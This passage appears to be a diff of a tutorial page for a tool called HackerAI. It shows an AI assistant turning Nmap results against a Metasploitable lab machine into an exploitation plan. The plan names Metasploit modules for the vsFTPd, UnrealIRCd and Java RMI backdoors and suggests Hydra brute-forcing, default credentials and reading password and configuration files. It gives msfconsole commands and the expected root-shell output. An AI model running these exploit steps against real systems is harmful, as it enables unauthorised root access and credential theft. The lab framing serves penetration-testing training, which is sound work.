style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Port 6667 (IRC)**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    *</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Vulnerability:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**UnrealIRCd Backdoor**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    *</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Impact:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> The server is running a trojaned version of UnrealIRCd from 2010, which contains a backdoor allowing remote code execution through a specific privileged command.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    **Action Plan:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    *   **Module:** `exploit/unix/irc/unreal_ircd_3281_backdoor` in Metasploit.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">### </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Enumeration and Further Exploitation Targets**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Beyond the immediate root shells, you have several services that are likely vulnerable to lateral movement or further access:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">*</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Web Services (Port 80):**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    *</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Directory Listing:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> You found </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">`/tikiwiki/`</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">, </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">`/phpMyAdmin/`</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">, </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">`/doc/`</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">, and </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">`/icons/`</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    *</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Vulnerable Applications:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> The server is hosting applications like </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**DVWA (Damn Vulnerable Web Application)**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> and </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Mutillidae**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">. These are purposefully vulnerable and are the perfect place to practice classic web application attacks like:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        *</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**SQL Injection:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Check the forms mentioned in the CSRF section or any parameter that interacts with the database.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        *</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**File Inclusion, Command Injection, XSS, CSRF:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> The Nmap script already identified multiple CSRF-ready forms.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    *</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**`phpinfo.php`:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> This file can reveal internal configuration details, which should be examined for clues.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    *</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Action Plan:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Use a web browser to navigate to </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">`http://172.16.59.128/`</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> and explore the directories. Use </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**`dirb`**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> or </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**`gobuster`**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> to perform aggressive brute-forcing of directories and files on the web server.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">*</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Database Services (Port 3306 - MySQL, Port 5432 - PostgreSQL):**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    *</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Vulnerability:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> The Nmap script failed to complete the detailed check for the notorious </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**MySQL `mysql</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">_vuln_</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">cve2012-2122`**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> but mentioned it. </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Both databases often contain weak or default credentials (e.g., `msfadmin:msfadmin`, `root:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">blank</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">`).**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    *</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Action Plan:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Use a tool like </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**`Hydra`**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> for brute-forcing common or default credentials against both services. Since you have a likely root shell via vsFTPd, you could also use that shell to extract the database passwords from configuration files (</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">`/etc/mysql/my.cnf`</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">, etc.).</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">*</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Legacy Services:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    *</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Port 23 (Telnet), Port 512, 513, 514 (r-services/shell):**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> These services are notorious for using insecure protocols or having weak/default credentials.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    *</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Action Plan:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Use </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**`Hydra`**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> for brute-force login attempts against </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Telnet**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">. Try default credentials on the r-services (like the hostname </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**`metasploitable`**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> with common usernames/passwords).</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">*</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**SMB/Samba (Port 139/445):**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    *</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">   </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Action Plan:**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Use </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**`enum4linux`**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> to list shares, users, and installed patches, a common first step for pivoting into a host via SMB.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">### </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Recommended Path**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">You have confirmed root access via the </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**vsFTPd backdoor**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">. The most efficient path is to exploit this immediately to gain a root shell, and then use that shell to complete the rest of your assessment, such as examining the </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">`/etc/passwd`</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> file for users, reading configuration files for passwords, and gathering evidence.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">**Which vulnerability do you want to target first?**</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> The most direct path to root is the vsFTPd backdoor.</span><br></div></code></pre></div></div>
+<details class="plain-large-code" data-plain-code-lines="185"><summary>Large code or log block<!-- --> · <!-- -->185<!-- --> lines · expand raw text</summary><button type="button">Copy raw text</button><pre tabindex="0"><code>That is an excellent, information-rich scan! As anticipated with Metasploitable, you&#x27;ve uncovered a trove of low-hanging fruit. This report is a clear, prioritized roadmap for exploitation.
+The Nmap Scripting Engine (NSE) has practically done the hard work of vulnerability assessment for you, identifying several critical flaws on various services and even confirming root-level exploitation on one of them.
+Here is a breakdown of the most critical findings and the recommended next steps, ranging from immediate root access to further enumeration for later exploitation:
+---
+### 
+**CRITICAL VULNERABILITIES (Immediate Root Access)**
+The most urgent finding is on 
+**Port 21 (FTP)**
+.
+*
+   
+**Service:**
+ vsFTPd
+*
+   
+**Vulnerability:**
+ 
+**vsFTPd version 2.3.4 Backdoor (CVE-2011-2523)**
+*
+   
+**Impact:**
+ The Nmap script provided the best possible result—it executed a command (
+`id`
+) and confirmed it received 
+**root privileges (`uid=0(root) gid=0(root)`)**
+. This means this vulnerability is immediately exploitable to get a root shell on the system.
+**Action Plan (Immediate Exploitation):**
+1.
+  
+**Exploit with Metasploit:**
+ Metasploit Framework is the ideal choice for this and is even referenced in the Nmap output.
+    *
+   
+**Module:**
+ 
+`exploit/unix/ftp/vsftpd_234_backdoor`
+    *
+   
+**Payload:**
+ Set the 
+`RHOSTS`
+ to 
+`172.16.59.128`
+ and run the exploit. The module simply requires a smiley face 
+`:)`
+ in the username to trigger the backdoor command listener (usually port 6200/tcp).
+### 
+**HIGH-PRIORITY VULNERABILITIES**
+These are other services with critical, confirmed vulnerabilities:
+1.
+  
+**Port 1099 (Rmiregistry)**
+    *
+   
+**Vulnerability:**
+ 
+**RMI registry default configuration Remote Code Execution**
+    *
+   
+**Impact:**
+ Java RMI (Remote Method Invocation) is often misconfigured to allow class loading from remote URLs, leading to remote code execution. This is another prime target for Metasploit.
+    **Action Plan:**
+    *   **Module:** `exploit/multi/misc/java_rmi_server` in Metasploit.
+2.
+  
+**Port 6667 (IRC)**
+    *
+   
+**Vulnerability:**
+ 
+**UnrealIRCd Backdoor**
+    *
+   
+**Impact:**
+ The server is running a trojaned version of UnrealIRCd from 2010, which contains a backdoor allowing remote code execution through a specific privileged command.
+    **Action Plan:**
+    *   **Module:** `exploit/unix/irc/unreal_ircd_3281_backdoor` in Metasploit.
+### 
+**Enumeration and Further Exploitation Targets**
+Beyond the immediate root shells, you have several services that are likely vulnerable to lateral movement or further access:
+*
+   
+**Web Services (Port 80):**
+    *
+   
+**Directory Listing:**
+ You found 
+`/tikiwiki/`
+, 
+`/phpMyAdmin/`
+, 
+`/doc/`
+, and 
+`/icons/`
+.
+    *
+   
+**Vulnerable Applications:**
+ The server is hosting applications like 
+**DVWA (Damn Vulnerable Web Application)**
+ and 
+**Mutillidae**
+. These are purposefully vulnerable and are the perfect place to practice classic web application attacks like:
+        *
+   
+**SQL Injection:**
+ Check the forms mentioned in the CSRF section or any parameter that interacts with the database.
+        *
+   
+**File Inclusion, Command Injection, XSS, CSRF:**
+ The Nmap script already identified multiple CSRF-ready forms.
+    *
+   
+**`phpinfo.php`:**
+ This file can reveal internal configuration details, which should be examined for clues.
+    *
+   
+**Action Plan:**
+ Use a web browser to navigate to 
+`http://172.16.59.128/`
+ and explore the directories. Use 
+**`dirb`**
+ or 
+**`gobuster`**
+ to perform aggressive brute-forcing of directories and files on the web server.
+*
+   
+**Database Services (Port 3306 - MySQL, Port 5432 - PostgreSQL):**
+    *
+   
+**Vulnerability:**
+ The Nmap script failed to complete the detailed check for the notorious 
+**MySQL `mysql
+_vuln_
+cve2012-2122`**
+ but mentioned it. 
+**Both databases often contain weak or default credentials (e.g., `msfadmin:msfadmin`, `root:
+&lt;
+blank
+&gt;
+`).**
+    *
+   
+**Action Plan:**
+ Use a tool like 
+**`Hydra`**
+ for brute-forcing common or default credentials against both services. Since you have a likely root shell via vsFTPd, you could also use that shell to extract the database passwords from configuration files (
+`/etc/mysql/my.cnf`
+, etc.).
+*
+   
+**Legacy Services:**
+    *
+   
+**Port 23 (Telnet), Port 512, 513, 514 (r-services/shell):**
+ These services are notorious for using insecure protocols or having weak/default credentials.
+    *
+   
+**Action Plan:**
+ Use 
+**`Hydra`**
+ for brute-force login attempts against 
+**Telnet**
+. Try default credentials on the r-services (like the hostname 
+**`metasploitable`**
+ with common usernames/passwords).
+*
+   
+**SMB/Samba (Port 139/445):**
+    *
+   
+**Action Plan:**
+ Use 
+**`enum4linux`**
+ to list shares, users, and installed patches, a common first step for pivoting into a host via SMB.
+### 
+**Recommended Path**
+You have confirmed root access via the 
+**vsFTPd backdoor**
+. The most efficient path is to exploit this immediately to gain a root shell, and then use that shell to complete the rest of your assessment, such as examining the 
+`/etc/passwd`
+ file for users, reading configuration files for passwords, and gathering evidence.
+**Which vulnerability do you want to target first?**
+ The most direct path to root is the vsFTPd backdoor.
+</code></pre></details>
 <p><strong>Now I want to exploit FTP vulnerability:</strong></p>
 <p>Start by asking HackerAI about this vuln FTP service. For example:</p>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">I</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> want </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> exploit </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">a</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> vulnerable FTP service.</span><br></div></code></pre></div></div>
 <p>HackerAI’s response:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Excellently chosen. The vsFTPd </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">2.3</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.4</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Backdoor </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">on</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> port </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">21</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">is</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> a high</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">confidence, root</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">level remote code execution vulnerability—the perfect starting point.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Here </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">is</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the plan </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> exploit it </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> gain a root shell </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">using</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the Metasploit Framework.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">1.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Launch Metasploit Console</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Open</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> your terminal </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">start</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the Metasploit framework console:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">bash</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">2.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Select</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the Exploit </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Module</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Search</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">select</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">specific</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">module</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> that Nmap identified </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> this vulnerability:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">bash</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">search</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> vsftpd </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">2.3</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.4</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">use exploit</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">unix</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ftp</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">vsftpd_234_backdoor</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">3.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Check</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Set</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Options</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">View</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the required options </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the module. You </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">only</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> need </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">set</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the RHOSTS (the target IP address).</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">bash</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">show</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> options</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Set</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the target IP address:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">bash</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">set</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> RHOSTS </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">172.16</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.59</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.128</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">You can verify the change:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">bash</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">show</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> options</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">The RPORT </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">is</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> correctly </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">set</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">21</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">, </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">default</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> payload (cmd</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">unix</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">interact) </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">is</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> also suitable </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> a basic interactive shell. The exploit works </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">by</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> sending a </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">specific</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> username containing a smiley face :) </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the FTP server, which triggers a pre</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">set</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> command backdoor </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">on</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> port </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">6200</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">tcp </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> gives you command execution.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">4.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Execute</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the Exploit</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Run the exploit:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">bash</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Expected Output</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">If successful, Metasploit will </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">connect</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the target, send the malicious payload, </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">open</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> a </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">new</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> session </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> you:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">*</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">] </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">172.16</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.59</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.128</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">21</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Connected </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> target FTP server.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">+</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">] </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">172.16</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.59</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.128</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">21</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Backdoor service has been spawned </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">on</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> port </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">6200</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">tcp.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">*</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">] Command shell session </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">1</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> opened (</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">172.16</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.59</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.XXX:XXXXX </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">172.16</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.59</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.128</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">6200</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">) </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">at</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">2025</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-11</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-26</span><br></div><div class="token-line" 